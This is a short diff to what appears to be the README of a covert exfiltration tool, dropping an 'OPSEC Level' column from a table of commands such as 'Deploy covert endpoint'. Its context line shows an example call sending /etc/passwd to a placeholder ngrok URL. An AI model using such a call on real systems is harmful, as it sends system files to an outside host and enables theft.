@@ -118,7 +118,7 @@ exfiltrate_file("/etc/passwd", "https://your-ngrok-url.ngrok.io")
 
 ## 🔧 Operational Commands
 
-| Command | Purpose | OPSEC Level |
+| Command | Purpose |
 |---------|---------|-------------|
 | `start` | Deploy covert endpoint |
 | `status` | Check operational status |
